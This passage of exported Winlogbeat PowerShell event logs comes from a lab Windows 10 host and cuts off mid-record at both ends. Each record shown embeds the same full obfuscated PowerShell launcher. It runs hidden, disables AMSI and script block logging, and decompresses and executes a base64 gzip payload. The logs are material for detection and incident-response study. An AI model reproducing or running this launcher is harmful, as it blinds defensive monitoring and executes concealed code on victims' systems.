5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6164,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.061",8XkLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:45.518","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6165,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.061",8nkLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:45.518","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5